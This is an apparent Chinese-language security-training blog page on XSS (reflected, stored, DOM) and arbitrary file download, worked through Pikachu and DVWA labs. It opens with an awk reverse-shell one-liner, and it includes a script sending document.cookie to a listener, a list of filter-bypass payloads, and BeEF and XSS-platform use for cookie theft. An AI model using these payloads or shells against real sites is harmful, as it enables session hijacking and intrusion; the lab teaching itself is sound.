<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">awk &#39;BEGIN &#123;s &#x3D; &quot;&#x2F;inet&#x2F;tcp&#x2F;0&#x2F;192.168.0.106&#x2F;9999&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c !&#x3D; &quot;exit&quot;) close(s); &#125;&#125;&#39; &#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="XSS跨站脚本攻击原理及分类"><a href="#XSS跨站脚本攻击原理及分类" class="headerlink" title="XSS跨站脚本攻击原理及分类"></a>XSS跨站脚本攻击原理及分类</h2><p>XSS是由于<strong>Web应用程序对用户的输入过滤不足</strong>而产生的，攻击者利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害者用户可能采取Cookie窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
<h3 id="XSS案例"><a href="#XSS案例" class="headerlink" title="XSS案例"></a>XSS案例</h3><p>有一段PHP代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>访问：</p>
<p><img src="/2023/012220963/117.PNG" alt="117"></p>
<p>输入的参数被当成了js的代码，并且执行了</p>
<h3 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h3><p>XSS 被称为跨站脚本攻击（Cross Site Scripting），由于和CSS 重名，所以改为XSS。</p>
<p>XSS 就是将恶意代码注入到网页中，以达到攻击的效果。</p>
<p>XSS主要使用javascript，javascript 可以非常灵活的操作html、css和浏览器。</p>
<p>XSS产生在前端，受目标浏览器内核的影响。IE浏览器会检测XSS并拦截。</p>
<h4 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h4><p>XSS漏洞执行的通常是JavaScript代码，一切js代码能做到事情，XSS就可以做。</p>
<ul>
<li>网络钓鱼，包括盗取各类用户账号</li>
<li><strong>窃取用户cookies</strong>，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作</li>
<li>劫持用户(浏览器)会话，执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件</li>
<li>强制弹出广告页面、刷流量</li>
<li>进行大量的客户端攻击、DDoS攻击</li>
<li>传播跨站脚本蠕虫</li>
</ul>
<p><strong>案例：</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">2011.3</span><span class="token number">.26</span>日起，github收到ddos攻击

<span class="token operator">-</span> 第一轮：百度统计的js文件被劫持篡改，每<span class="token number">2</span>秒向github上的两个页面发出请求，被github的弹窗警告拦住
<span class="token operator">-</span> 第二轮：跨网域<span class="token operator">&lt;</span>img<span class="token operator">></span>攻击，被github检查referer拦住
<span class="token operator">-</span> 第三轮：<span class="token constant">DDOS</span>攻击github Pages
<span class="token operator">-</span> 第四轮：<span class="token constant">SYN</span> flood<span class="token punctuation">,</span>利用<span class="token constant">TCP</span>协议缺陷发送大批伪造的<span class="token constant">TCP</span>链接请求，耗尽GitHub的资源<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="XSS漏洞搜索"><a href="#XSS漏洞搜索" class="headerlink" title="XSS漏洞搜索"></a>XSS漏洞搜索</h3><p>有输出回显的地方都有可能产生XSS漏洞</p>
<h3 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h3><p>根据XSS的触发特性，可以将XSS分为反射型XSS、存储型XSS、DOM型XSS。</p>
<p><strong>反射型</strong>：每次触发漏洞的时候，都要将恶意代码通过GET/POST方式提交，然后触发漏洞</p>
<p><strong>存储型</strong>：恶意代码被服务器存储，在访问页面的时候会被直接触发（如留言板等场景）</p>
<p><strong>DOM型</strong>：恶意代码不经过后端服务器处理，直接在浏览器中执行</p>
<h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>Pikachu靶场，Cross-Site Scripting</p>
<p>在本浏览器构造一个XSS的链接</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//域名/vul/xss/xss_reflected_get.php?/message=%3Cscript%3Ealert%28%27123%27%29%3C%2Fscript%3E&amp;submit=submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/118.PNG" alt="118"></p>
<p><strong>本关字符限制是20个字符，在构造payload时要改相关网页代码参数</strong></p>
<p><strong>其他浏览器尝试结果：</strong></p>
<p><img src="/2023/012220963/119.PNG" alt="119"></p>
<p><strong>图解：</strong></p>
<p><img src="/2023/012220963/120.PNG" alt="120"></p>
<ol>
<li><p>黑客构造有问题的链接</p>
</li>
<li><p>发送钓鱼链接给受害者</p>
</li>
<li><p>受害者访问链接</p>
</li>
<li><p>受害者在浏览器中执行注入的scirpt代码</p>
</li>
<li><p>用户完全不知情！</p>
</li>
</ol>
<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>Pikachu靶场，Cross-Site Scripting</p>
<p>将js恶意代码写入留言板中，前面可以加东西进行伪装</p>
<p><img src="/2023/012220963/122.PNG" alt="122"></p>
<p><strong>测试结果</strong></p>
<p><img src="/2023/012220963/123.PNG" alt="123"></p>
<p>此时只要其他用户看到该条留言，js恶意代码就会执行</p>
<p><strong>图解：</strong></p>
<p><img src="/2023/012220963/121.PNG" alt="121"></p>
<p>黑客将js代码注入到了服务器的数据库中，导致所有用户在访问该页面时，都会执行这一段js代码。</p>
<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p><strong>代码操作DOM树：</strong></p>
<p><img src="/2023/012220963/124.PNG" alt="124"></p>
<p>使用js代码来刷新页面，没有经过后端的服务器</p>
<p>Pikachu靶场，Cross-Site Scripting</p>
<p>DOM xss-x</p>
<p><strong>输入：</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//'>&lt;img src="#" onmouseover="alert('xss')"></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/125.PNG" alt="125"></p>
<p>分析源码：</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xssd_main<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
        <span class="token keyword">function</span> <span class="token function">domxss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">var</span> str <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">;</span>
            <span class="token keyword">var</span> txss <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"text="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取输入内容</span>
            <span class="token keyword">var</span> xss <span class="token operator">=</span> txss<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将输入中的“/\+/g”用空格替代</span>
            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"dom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"&lt;a href='"</span><span class="token operator">+</span>xss<span class="token operator">+</span><span class="token string">"'>就让往事都随风,都随风吧&lt;/a>"</span><span class="token punctuation">;</span><span class="token comment">//将修改后的内容进行拼接</span>
       <span class="token punctuation">&#125;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请说出你的伤心往事<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dom<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>#<span class="token punctuation">'</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token value javascript language-javascript"><span class="token function">domxss</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">'</span></span></span><span class="token punctuation">></span></span>有些费尽心机想要忘记的事情,后来真的就忘掉了<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-html" data-language="html"><code class="language-html">//<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onmouseover</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>'>就让往事都随风,都随风吧<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>其他payload</strong></p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html">//'><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>注意：</strong>消除闭合符</p>
<p>总结：Dom型就是完全在前端中进行操作，然后触发并执行js代码</p>
<h4 id="反射型XSS和DOM型XSS"><a href="#反射型XSS和DOM型XSS" class="headerlink" title="反射型XSS和DOM型XSS"></a>反射型XSS和DOM型XSS</h4><ul>
<li><p>反射型XSS会将参数发送到后端的服务器中，服务器经过查询或其他的操作后，又将该字符串完整的返回到了页面上</p>
</li>
<li><p>DOM型XSS没有经过后端服务器的处理，直接在浏览器中执行js代码操作DOM</p>
</li>
</ul>
<h3 id="XSS实例"><a href="#XSS实例" class="headerlink" title="XSS实例"></a>XSS实例</h3><p>哪些页面容易出现跨站漏洞</p>
<ul>
<li>注册页面</li>
<li>在线咨询的输入位置(与服务器有交互)</li>
<li>论坛留言</li>
</ul>
<h4 id="Cookie-amp-Session"><a href="#Cookie-amp-Session" class="headerlink" title="Cookie&amp;Session"></a>Cookie&amp;Session</h4><p>一些网站有自动登录的功能，并且可以在不退出浏览器的情况下，保留你的登录状态。这个<strong>自动登录的功能，就是使用了cookie</strong>，而<strong>保留登录状态则使用了session</strong>。</p>
<p>以B站为例，登录一次之后，很长一段时间就不需要我们输入账号和密码了。</p>
<p><strong>cookie就是每次在http请求时，自动发送数据给服务器的技术。</strong></p>
<p><img src="/2023/012220963/126.PNG" alt="126"></p>
<p>浏览器中也可以查看保存的cookie**(也可以安装扩展cookie editor)**</p>
<p>F12进入控制台，输入 document.cookie即可查看</p>
<p><img src="/2023/012220963/127.PNG" alt="127"></p>
<p>或者在应用程序中，查看存储</p>
<p><img src="/2023/012220963/128.PNG" alt="128"></p>
<p>使用cookie就可以免用户名和密码进行登录。</p>
<h4 id="使用XSS盗取Cookie"><a href="#使用XSS盗取Cookie" class="headerlink" title="使用XSS盗取Cookie"></a>使用XSS盗取Cookie</h4><p>环境：</p>
<p>本地DVWA靶场(pikachu环境的也可以)</p>
<p>等级：low</p>
<p>登录 smithy / password，等级设为low</p>
<p>在 XSS Stored 中，注入以下js代码</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8000?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>在127.0.0.1开启http服务监听，使用python快速开启</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server<span class="token operator">//</span>开启http<span class="token punctuation">.</span>server服务
ctrl<span class="token operator">+</span>c或者httpd<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span>关闭http<span class="token punctuation">.</span>server服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>刷新任意用户的 存储性XSS的页面，等级为low的会直接将cookie当做http get的参数传给开启的服务器</p>
<p><img src="/2023/012220963/129.PNG" alt="129"></p>
<p><strong>注意：自己访问，留言加一，返回cookie;其他人访问，留言数不变，返回cookie</strong></p>
<p>使用Cookie Editor浏览器插件修改cookie，实现登录(也可以使用burp抓包修改)</p>
<h3 id="XSS靶场训练"><a href="#XSS靶场训练" class="headerlink" title="XSS靶场训练"></a>XSS靶场训练</h3><p>靶场链接：</p>
<p><a target="_blank" rel="noopener" href="https://xss.haozi.me/">https://xss.haozi.me</a></p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html">/*＜script＞var junk = '＜/script＞＜script＞alert（1）＜/script＞';＜/script＞
＜script＞top['alert'](3)＜/script＞
＜script＞window['alert'](0)＜/script＞
＜script＞document．write('＜a hr\ef=j\avas\cript\:a\lert(2)＞blah＜/a＞');＜/script＞
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>clickme<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
0x03
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
0x04
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script>parent.alert<span class="token entity" title="&#40;">&amp;#40;</span>1<span class="token entity" title="&#41;">&amp;#41;</span>&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
0x05
    --!><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
0x06
    type=image src onerror
	=alert(1)
0x07
    &lt;svg onload=alert(1) /
    &lt;svg onload=alert(1) 
0x08
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
0x09
    https://www.segmentfault.com"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span>
<span class="token number">0x0a</span>
    https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com<span class="token punctuation">.</span>haozi<span class="token punctuation">.</span>me<span class="token operator">/</span>j<span class="token punctuation">.</span>js
    https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com@xss<span class="token punctuation">.</span>haozi<span class="token punctuation">.</span>me<span class="token operator">/</span>j<span class="token punctuation">.</span>js
<span class="token number">0x0b</span>
    <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://www.segmentfault.com.haozi.me/j.js"</span><span class="token operator">></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
0x0c
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sscriptcript</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.segmentfault.com.haozi.me/j.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sscriptcript</span><span class="token punctuation">></span></span>
0x0d
	asasdad
	alert(1)
	-->
0x0e
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ſcript</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.segmentfault.com.haozi.me/j.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
0x0f
	'),alert(1)//
0x10
	alert(1)*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="XSS过滤绕过"><a href="#XSS过滤绕过" class="headerlink" title="XSS过滤绕过"></a>XSS过滤绕过</h3><p>绕过参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html">绕过XSS过滤姿势总结</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfsec/p/15178028.html">XSS绕过总结</a></p>
<h2 id="XSS平台利用"><a href="#XSS平台利用" class="headerlink" title="XSS平台利用"></a>XSS平台利用</h2><h3 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h3><p>XSS平台是测试XSS漏洞获取并接收数据的测试使用的Web平台。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://xss8.cc/">https://xss8.cc/</a></li>
<li><a target="_blank" rel="noopener" href="https://xss.pt/">https://xss.pt/</a></li>
<li>自己搭建</li>
</ul>
<h4 id="XSS平台搭建"><a href="#XSS平台搭建" class="headerlink" title="XSS平台搭建"></a>XSS平台搭建</h4><h5 id="BlueLotus-XSSReceiver"><a href="#BlueLotus-XSSReceiver" class="headerlink" title="BlueLotus_XSSReceiver"></a>BlueLotus_XSSReceiver</h5><p>XSS打cookie工具：<strong>BlueLotus_XSSReceiver</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/sqlsec/BlueLotus_XSSReceiver">https://github.com/sqlsec/BlueLotus_XSSReceiver</a></p>
<p><strong>使用：</strong></p>
<p><img src="/2023/012220963/130.png" alt="130"></p>
<p><img src="/2023/012220963/131.png" alt="131"></p>
<p>将生成的payload注入目标网站，得到cookie返回信息</p>
<p><img src="/2023/012220963/132.png" alt="132"></p>
<h5 id="xss-platform"><a href="#xss-platform" class="headerlink" title="xss_platform"></a>xss_platform</h5><p><a target="_blank" rel="noopener" href="https://github.com/anwilx/xss_platform">https://github.com/anwilx/xss_platform</a></p>
<h3 id="Beef平台"><a href="#Beef平台" class="headerlink" title="Beef平台"></a>Beef平台</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>推荐测试时在kali中安装，实战时需要在公网服务器上安装</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">apt-get install beef-xss -y
# 如果安装失败，先执行下面的命令
apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="启停Beef"><a href="#启停Beef" class="headerlink" title="启停Beef"></a>启停Beef</h4><pre class="line-numbers language-none"><code class="language-none">beef-xss
beef-xss-stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>首次启动时，需要设置一个登录账号和密码</p>
<h4 id="注入xss"><a href="#注入xss" class="headerlink" title="注入xss"></a>注入xss</h4><p>启动beef时，会弹出js的路径，将此路径构造成xss的payload注入即可</p>
<p><img src="/2023/012220963/133.PNG" alt="133"></p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>在目标上线后，commands标签里有各种模块</p>
<p><img src="/2023/012220963/134.PNG" alt="134"></p>
<h5 id="执行任意JaveScript"><a href="#执行任意JaveScript" class="headerlink" title="执行任意JaveScript"></a>执行任意JaveScript</h5><p>在Misc -&gt; Raw JavaScript中可以执行任意js代码</p>
<p><img src="/2023/012220963/135.PNG" alt="135"></p>
<h5 id="获取Cookie"><a href="#获取Cookie" class="headerlink" title="获取Cookie"></a>获取Cookie</h5><p><img src="/2023/012220963/136.PNG" alt="136"></p>
<h5 id="社工利用"><a href="#社工利用" class="headerlink" title="社工利用"></a>社工利用</h5><p><img src="/2023/012220963/137.PNG" alt="137"></p>
<h2 id="任意文件下载读取漏洞"><a href="#任意文件下载读取漏洞" class="headerlink" title="任意文件下载读取漏洞"></a>任意文件下载读取漏洞</h2><h3 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>一些网站应用程序会提供用户下载文件的功能，如果下载文件的文件名或路径能够被用户所控制，就会</p>
<p>造成服务器中任意文件被下载的漏洞。</p>
<h4 id="利用危害"><a href="#利用危害" class="headerlink" title="利用危害"></a>利用危害</h4><p>用户可利用任意文件下载漏洞下载服务器日志文件、数据库配置文件、网站源代码、密码信息文件以及</p>
<p>接口信息文件。</p>
<p>漏洞不会直接对服务器造成影响，需要进一步的操作。</p>
<h3 id="漏洞演示-1"><a href="#漏洞演示-1" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>pikachu靶场：unsafe filedownload</p>
<p>图片的下载链接：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.pikachu.com/vul/unsafedownload/execdownload.php?filename=pj.png</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>图片链接：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.pikachu.com/vul/unsafedownload/download/ns.png</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>分析：</p>
<p><img src="/2023/012220963/138.png" alt="138"></p>
<p>Get传参方式</p>
<p><img src="/2023/012220963/139.png" alt="139"></p>
